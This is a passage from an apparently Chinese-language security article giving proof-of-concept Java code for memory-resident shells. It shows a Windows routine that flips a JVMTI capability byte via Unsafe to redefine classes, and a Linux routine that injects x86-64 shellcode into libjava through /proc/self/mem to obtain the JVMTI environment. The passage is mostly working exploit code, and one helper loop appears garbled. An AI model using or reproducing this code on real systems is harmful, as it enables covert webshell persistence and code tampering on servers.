            }
            long native_jvmtienv=unsafe.getLong(JPLISAgent+pointerLength);
            if (pointerLength==4)
            {
                unsafe.putByte(native_jvmtienv+201 , (byte) 2);
            }
            else
            {
                unsafe.putByte(native_jvmtienv+361 , (byte) 2);
            }
            try {
                Class instrument_clazz = Class.forName("sun.instrument.InstrumentationImpl");
                Constructor constructor = instrument_clazz.getDeclaredConstructor(long.class, boolean.class, boolean.class);
                constructor.setAccessible(true);
                Object inst = constructor.newInstance(JPLISAgent, true, false);
                ClassDefinition definition = new ClassDefinition(Class.forName(className), classBody);
                Method redefineClazz = instrument_clazz.getMethod("redefineClasses", ClassDefinition[].class);
                redefineClazz.invoke(inst, new Object[] {
                        new ClassDefinition[] {
                                definition
                        }
                });
            }
            catch (Throwable error)
            {
                error.printStackTrace();
                throw  error;
            }
        }
        /**
         * long 转字节数组，小端
         */
        public static byte[] long2ByteArray_Little_Endian(long l,int length) {
            byte[] array = new byte[length];
            for (int i = 0; i > (i * 8));
            }
            return array;
        }
        private static byte[] replaceBytes(byte[] bytes,byte[] byteSource,byte[] byteTarget)
        {
            for(int i=0;i<bytes.length;i++)
            {
                boolean bl=true;//从当前下标开始的字节是否与欲替换字节相等;
                for(int j=0;j<byteSource.length;j++)
                {
                    if(i+j<bytes.length&&bytes[i+j]==byteSource[j])
                    {
                    }
                    else
                    {
                        bl=false;
                    }
                }
                if(bl)
                {
                    System.arraycopy(byteTarget, 0, bytes, i, byteTarget.length);
                }
            }
            return bytes;
        }
    }
上面Poc中有两个属性，className和classBody。如果想要动态修改某个类的字节码，只需要实例化WindowsVirtualMachine类，设置className和classBody为目标类名和新的字节码数组，然后调用work方法，即可完成类的热修改。
#### Linux平台
在Linux平台下，将上文的shellcode整合，利用代码如下：
    /**
     * @version 1.0
     * @Author 游望之
     * @注释
     */
    import sun.misc.Unsafe;
    import java.io.BufferedReader;
    import java.io.FileReader;
    import java.io.IOException;
    import java.io.RandomAccessFile;
    import java.lang.instrument.ClassDefinition;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.Field;
    import java.lang.reflect.Method;
    import java.nio.ByteBuffer;
    import java.nio.ByteOrder;
    public class MemShell {
        private void agentForLinux(String className,byte[] classBody) throws Exception {
            FileReader fin  = new FileReader("/proc/self/maps");
            BufferedReader reader = new BufferedReader(fin);
            String line;
            long RandomAccessFile_length = 0, JNI_GetCreatedJavaVMs = 0;
            while ((line = reader.readLine()) != null)
            {
                String[] splits = line.trim().split(" ");
                if(line.endsWith("libjava.so") && RandomAccessFile_length == 0) {
                    String[] addr_range = splits[0].split("-");
                    long libbase = Long.parseLong(addr_range[0], 16);
                    String elfpath = splits[splits.length - 1];
                    RandomAccessFile_length = find_symbol(elfpath, "Java_java_io_RandomAccessFile_length", libbase);
                }else if(line.endsWith("libjvm.so") && JNI_GetCreatedJavaVMs == 0) {
                    String[] addr_range = splits[0].split("-");
                    long libbase = Long.parseLong(addr_range[0], 16);
                    String elfpath = splits[splits.length - 1];
                    JNI_GetCreatedJavaVMs = find_symbol(elfpath, "JNI_GetCreatedJavaVMs", libbase);
                }
                if(JNI_GetCreatedJavaVMs != 0 && RandomAccessFile_length != 0)
                    break;
            }
            fin.close();
            //修改Java_java_io_RandomAccessFile_open0的native代码，调用JNI_GetCreatedJavaVMs获取JavaVM，再通过JavaVM获取jvmtienv
            RandomAccessFile fout = new RandomAccessFile("/proc/self/mem", "rw");
            //RSP 16字节对齐
            byte[] stack_align = {0x55, 0x48, (byte)0x89, (byte)0xe5, 0x48, (byte)0xc7, (byte)0xc0, 0xf, 0, 0, 0, 0x48, (byte)0xf7, (byte)0xd0};
            byte[] movabs_rax = {0x48, (byte) 0xb8};
            ByteBuffer buffer = ByteBuffer.allocate(Long.BYTES);
            buffer.order(ByteOrder.LITTLE_ENDIAN);
            buffer.putLong(0, JNI_GetCreatedJavaVMs);
            byte[] b = {0x48, (byte) 0x83, (byte) 0xEC, 0x40, 0x48, 0x31, (byte) 0xF6, 0x48, (byte) 0xFF, (byte) 0xC6, 0x48, (byte) 0x8D, 0x54, 0x24, 0x04, 0x48,
                    (byte) 0x8D, 0x7C, 0x24, 0x08, (byte) 0xFF, (byte) 0xD0, 0x48, (byte) 0x8B, 0x7C, 0x24, 0x08, 0x48, (byte) 0x8D, 0x74, 0x24, 0x10,
                    (byte) 0xBA, 0x00, 0x02, 0x01, 0x30, 0x48, (byte) 0x8B, 0x07, (byte) 0xFF, 0x50, 0x30, 0x48, (byte) 0x8B, 0x44, 0x24, 0x10,
                    0x48, (byte) 0x83, (byte) 0xC4, 0x40, (byte)0xC9, (byte) 0xC3 };
            int shellcode_len = b.length + 8 + movabs_rax.length + stack_align.length;
            long landingpad = RandomAccessFile_length;
            byte[] backup = new byte[shellcode_len];
            fout.seek(landingpad);
            fout.read(backup);
            fout.seek(landingpad);
            fout.write(stack_align);
            fout.write(movabs_rax);
            fout.write(buffer.array());
            fout.write(b);
            fout.close();
            long native_jvmtienv = fout.length(); //触发执行
            System.out.printf("native_jvmtienv %x\n", native_jvmtienv);
            //恢复代码
            fout = new RandomAccessFile("/proc/self/mem", "rw");
            fout.seek(RandomAccessFile_length);
            fout.write(backup);
            fout.close();
            Unsafe unsafe = null;
            try {
                Field field = sun.misc.Unsafe.class.getDeclaredField("theUnsafe");
                field.setAccessible(true);
                unsafe = (sun.misc.Unsafe) field.get(null);
            } catch (Exception e) {
                throw new AssertionError(e);
            }
            //libjvm.so的jvmti_RedefineClasses函数会校验if ( (*((_BYTE *)jvmtienv + 361) & 2) != 0 )